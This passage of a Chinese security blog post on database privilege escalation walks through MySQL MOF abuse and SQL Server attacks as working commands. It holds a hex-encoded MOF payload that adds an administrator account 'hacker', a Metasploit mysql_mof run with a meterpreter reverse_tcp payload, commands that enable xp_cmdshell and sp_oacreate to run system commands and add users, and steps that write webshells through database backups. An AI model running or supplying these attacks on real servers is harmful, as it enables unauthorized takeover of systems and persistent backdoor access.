+                      alt="image-20230418141726103"
+                ></p>
+<p>接下来我们需要将在www文件夹下的test.mof文件导出至 C:\WINDOWS\system32\wbem\mof 下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;E:/phpstudy/phpstudy_pro/WWW/test.mof&#x27;) into dumpfile &#x27;C:/WINDOWS/system32/wbem/mof/test.mof&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p>接下来只需要等待一段时间他就会自动执行了</p>
+<p>一般来说mof文件夹中有bad和good文件夹，成功执行的会被放入good文件夹中</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418142239889.png"
+                      alt="image-20230418142239889"
+                ></p>
+<p>查询<code>net user</code>就知道它添加了一个管理员账户hacker了，提权成功</p>
+<h4 id="简单方法"><a href="#简单方法" class="headerlink" title="简单方法"></a>简单方法</h4><p>直接利用sql语句将恶意代码写入到mof目录下</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A into dumpfile &quot;C:/windows/system32/wbem/mof/test2.mof&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>之所以十六进制编码传输是为了数据不丢失</p>
+<h4 id="MSF自带模块提权"><a href="#MSF自带模块提权" class="headerlink" title="MSF自带模块提权"></a>MSF自带模块提权</h4><p>MSF中具有mof的提权模块</p>
+<p>我们要先上传test.mof文件</p>
+<p>然后设置一系列参数</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/mysql/mysql_mof</span><br><span class="line"> </span><br><span class="line"># 设置payload</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line"> </span><br><span class="line"># 设置目标 MySQL 的基础信息</span><br><span class="line">set rhosts 对方IP</span><br><span class="line">set username 账号</span><br><span class="line">set password 密码</span><br><span class="line">run</span><br></pre></td></tr></table></figure></div>
+
+<p>然后就行了</p>
+<h4 id="收尾工作"><a href="#收尾工作" class="headerlink" title="收尾工作"></a>收尾工作</h4><p>由于mof文件会隔一段时间一直被调用，所以必须及时清除这个文件</p>
+<p>但是想要清除这个文件必须要暂时关闭winmgmt服务再删除mof文件</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 停止 winmgmt 服务</span><br><span class="line">net stop winmgmt</span><br><span class="line"> </span><br><span class="line"># 删除 Repository 文件夹</span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"> </span><br><span class="line"># 手动删除 mof 文件</span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"> </span><br><span class="line"># 删除创建的用户</span><br><span class="line">net user hacker /delete</span><br><span class="line"> </span><br><span class="line"># 重新启动服务</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure></div>
+
+<p>然后mof提权的全部内容就这样结束了</p>
+<h2 id="SQL-Server提权"><a href="#SQL-Server提权" class="headerlink" title="SQL Server提权"></a>SQL Server提权</h2><p>SQL Server提权主要依赖于自带的存储过程，要求SQL Server 权限—-&gt;系统权限</p>
+<p>而存储过程就是一个可编程的函数，他在数据库中创建并且保存，是存储在服务器中的一组预编译过的T-SQL语句，我们可以将存储过程认为是函数调用过程，可以使用execute命令执行存储过程</p>
+<p>这个它主要分为系统存储过程，扩展存储过程，用户系定义的存储过程</p>
+<p>存储过程主要存储在master数据库中，以sp_为前缀，在任何数据库中都可以调用</p>
+<p>扩展存储过程中主要是对动态链接库的（dll）函数调用，主要用于客户端于服务器端  或者和护短之间进行通信，以xp_为前缀</p>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>要执行系统命令，首先需要获取sqlserver数据库权限（sa），然后借助自带的存储过程进行提权，就可以实现SQL Server权限—–&gt;系统权限</p>
+<h4 id="xp-cmdshell利用过程"><a href="#xp-cmdshell利用过程" class="headerlink" title="xp_cmdshell利用过程"></a>xp_cmdshell利用过程</h4><p>xp_cmdshell是一个扩展存储过程</p>
+<p>可以让系统管理员具有操作cmd的权限，并且以文本方式返回输出</p>
+<p>xp_cmdshell在SQLserver2000中默认开启，可以直接执行系统命令</p>
+<p>2005本身及之后的版本默认禁止，所以想要使用，就需要拥有SA账号相应权限，使用sp_configure将其开启。</p>
+<p>所以我们要先判断是否是sa权限</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select is_srvrolemember(&#x27;sysadmin&#x27;)</span><br></pre></td></tr></table></figure></div>
+
+<p>返回1就是</p>
+<p>还要判断xp_cmdshell是否存在，1就是存在，0就是不存在</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) FROM master..sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27; </span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161347953.png"
+                      alt="image-20230418161347953"
+                ></p>
+<p>如果是0的话，可以执行下列命令开启</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;RECONFIGURE</span><br></pre></td></tr></table></figure></div>
+
+<p>不开启的话执行命令会报错</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161455586.png"
+                      alt="image-20230418161455586"
+                ></p>
+<p>要关闭的话</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec sp_configure &#x27;show advanced options&#x27;,1;RECONFIGURE;exec sp_configure &#x27;xp_cmdshell&#x27;,0;RECONFIGURE;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>如果被删除可以通过xplog70.dll来恢复</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;);</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>但是…如果xplog70.dll也被删除了的也可以恢复</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master.sys.sp_addextendedproc &#x27;xp_cmdshell&#x27;, &#x27;C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&#x27;;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>一切都配置好之后就可以通过xp_cmdshell来执行系统命令了</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;whoami&#x27;;</span><br><span class="line">或者</span><br><span class="line">EXEC master..xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418161326688.png"
+                      alt="image-20230418161326688"
+                ></p>
+<h4 id="sp-oacreate实现提权操作"><a href="#sp-oacreate实现提权操作" class="headerlink" title="sp_oacreate实现提权操作"></a>sp_oacreate实现提权操作</h4><p>当xp_cmdhsell被删除的时候，可以借助SQL Server中的COM 逐渐sp_oacreate来执行系统命令</p>
+<p>原理是SQL Server提供和了一些函数访问OLE对象，sp_oacreate和sp_oamethod这两个可以调用OLE控件，间接来获取shell</p>
+<h6 id="啥是OLE？"><a href="#啥是OLE？" class="headerlink" title="啥是OLE？"></a>啥是OLE？</h6><p>OLE是一种面向对象的技术，是一个API接口，里面包含了可以重复使用的软件组件(COM)</p>
+<p>要判断是否可以使用sp_oacreate执行系统命令</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;whoami&#x27;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163725677.png"
+                      alt="image-20230418163725677"
+                ></p>
+<p>如果报错的话，没事，还可以使用以下命令打开</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br><span class="line">EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;</span><br><span class="line">RECONFIGURE WITH OVERRIDE;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418163825197.png"
+                      alt="image-20230418163825197"
+                ></p>
+<p>然后就可以执行命令了，但是它没有回显，所以得用txt文件的形式导出</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami &gt;c:\\test.txt&#x27; </span><br></pre></td></tr></table></figure></div>
+
+<p>执行whoami得出</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418164047098.png"
+                      alt="image-20230418164047098"
+                ></p>
+<p>也可以使用这个来添加新用户</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user hack Password@ /add</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h4 id="使用CLR执行系统命令"><a href="#使用CLR执行系统命令" class="headerlink" title="使用CLR执行系统命令"></a>使用CLR执行系统命令</h4><p>SQL Server2005开始，就集成了用于Microsoft Windows 的 .NET Framework的公共语言运行时的（CLR）组件</p>
+<p>这个意味着可以使用 .NET Framework 语言（包括 Microsoft Visual Basic .NET 和 Microsoft Visual C#）来编写存储过程、触发器、用户定义类型、用户定义函数、用户定义聚合和流式表值函数</p>
+<p>具体不太清楚，先空着吧</p>
+<h4 id="数据库差异备份写webshell"><a href="#数据库差异备份写webshell" class="headerlink" title="数据库差异备份写webshell"></a>数据库差异备份写webshell</h4><p>差异备份数据库得到webshell，在SQL Server里面dbo和sa都有备份数据库的权限</p>
+<p>我们可以吧数据库备份成asp文件，这样我们就可以通过mssqlserver的备份数据库生成一个网页小马</p>
+<h6 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h6><p>具有db_owner权限</p>
+<p>知道web绝对路径</p>
+<h6 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第一步</span><br><span class="line">create DATABASE Testdb;</span><br><span class="line">第二步</span><br><span class="line">backup database Testdb to disk = &#x27;c:\test2.bak&#x27;;</span><br><span class="line">use Testdb;</span><br><span class="line">create table [dbo].[Testdb] ([cmd] [image]);</span><br><span class="line">insert into Testdb(cmd) values(0x3c3f70687020706870696e666f28293b3f3e);</span><br><span class="line"></span><br><span class="line">3c3f70687020706870696e666f28293b3f3e为16进制的&lt;?php phpinfo();?&gt;，实际情况下可以改成一句话木马</span><br><span class="line"></span><br><span class="line">backup database Testdb to disk=&#x27;C:\\phpinfo.php&#x27; WITH DIFFERENTIAL,FORMAT;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165759713.png"
+                      alt="image-20230418165759713"
+                ></p>
+<p>生成两个文件，其中phpinfo.php就是webshell换成一句话木马就具有攻击性了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165827318.png"
+                      alt="image-20230418165827318"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418165918697.png"
+                      alt="image-20230418165918697"
+                ></p>
+<h4 id="日志差异备份写webshell"><a href="#日志差异备份写webshell" class="headerlink" title="日志差异备份写webshell"></a>日志差异备份写webshell</h4><p>这个的主要原理也是利用备份写入一句话木马</p>
+<h6 id="前提-1"><a href="#前提-1" class="headerlink" title="前提"></a>前提</h6><p>LOG备份的要求是他的数据库备份过，而且选择恢复模式得是完整模式</p>
+<h6 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h6><p>备份的文件大小比较小</p>
+<h6 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h6><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">create database Testdb      --新建数据库Testdb</span><br><span class="line"></span><br><span class="line">alter database Testdb set RECOVERY FULL;   --修改数据库恢复模式为 完整模式</span><br><span class="line"></span><br><span class="line">create table cmd (a image);        --创建一张表cmd，只有一个列 a，类型为image</span><br><span class="line"></span><br><span class="line">backup log Testdb to disk= &#x27;C:\\1.php&#x27; with init;   --备份表到指定路径</span><br><span class="line"></span><br><span class="line">insert into cmd (a) values(0x3c3f706870706870696e666f28293b3f3e);  --插入一句话到cmd表里</span><br><span class="line"></span><br><span class="line">backup log Testdb to disk=&#x27;C:\\phpinfo.php&#x27;;   --把操作日志备份到指定文件</span><br></pre></td></tr></table></figure></div>
+
+<p>执行完后</p>
+<p>一样的，就可以生成两个文件</p>
+<p>其中phpinfo.php就是webshell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20230418170435006.png"
+                      alt="image-20230418170435006"
+                ></p>
+
+            </div>
+
+            
+                <div class="post-copyright-info">
+                    <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 数据库提权</li>
+        <li><strong>Author:</strong> yuBetter</li>
+        <li><strong>Created at:</strong> 2023-05-15 09:26:43</li>
+        
+            <li>
+                <strong>Updated at:</strong> 2023-05-15 09:29:41
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://yubetter.github.io/2023/05/15/数据库提权/
+        </li>
+        <li>
+            <strong>License:</strong> This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+        </li>
+    </ul>
+</div>
+
+                </div>
+            
+
+            
+
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                            rel="prev"
+                            href="/2023/05/15/%E5%86%85%E7%BD%91%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96/"
+                            >
+                                <span class="left arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-left"></i>
+                                </span>
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">内网权限持久化</span>
+                                    <span class="post-nav-item">Prev posts</span>
+                                </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                            rel="next"
+                            href="/2023/05/15/XXE/"
+                            >
+                                <span class="title flex-center">
+                                    <span class="post-nav-title-item">XXE</span>
+                                    <span class="post-nav-item">Next posts</span>
+                                </span>
+                                <span class="right arrow-icon flex-center">
+                                    <i class="fa-solid fa-chevron-right"></i>
+                                </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+
+            
+                <div class="comment-container">
+                    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-pjax>
+        import { init } from 'https://evan.beee.top/js/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">数据库提权</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-text">MySQL数据库提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#UDF%E6%8F%90%E6%9D%83"><span class="nav-text">UDF提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="nav-text">MOF提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-Server%E6%8F%90%E6%9D%83"><span class="nav-text">SQL Server提权</span></a></li></ol>
+
+    </div>
+</div>
+            </div>
+        
+    </div>
+</div>
+
+
+                
+
+            </div>
+            
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">yuBetter</a>
+        </div>
+        
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv" class="busuanzi_container_site_uv">
+                        VISITOR COUNT&nbsp;<span id="busuanzi_value_site_uv" class="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="busuanzi_container_site_pv">
+                        TOTAL PAGE VIEWS&nbsp;<span id="busuanzi_value_site_pv" class="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            <span class="powered-by-container">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" href="https://hexo.io">Hexo</a></span>
+                <br>
+            <span class="theme-version-container">THEME&nbsp;<a class="theme-version" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.1.1</a>
+        </div>
+        
+        
+        
+            <div id="start_div" style="display:none">
+                2022/8/17 11:45:14
+            </div>
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+        
+            <script async data-pjax>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-expand-width flex-center">
+            <i class="fa-regular fa-expand"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fa-solid fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fa-solid fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+<script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/utils.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/main.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/navbarShrink.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/scrollTopBottom.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/lightDarkSwitch.js"></script>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/localSearch.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/codeBlock.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/lazyload.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/runtime.js"></script>
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/odometer.min.js"></script>
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/Typed.min.js"></script>
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/typed.js"></script>
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/tocToggle.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/anime.min.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/toc.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/tabs.js"></script>
+    
+</div>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
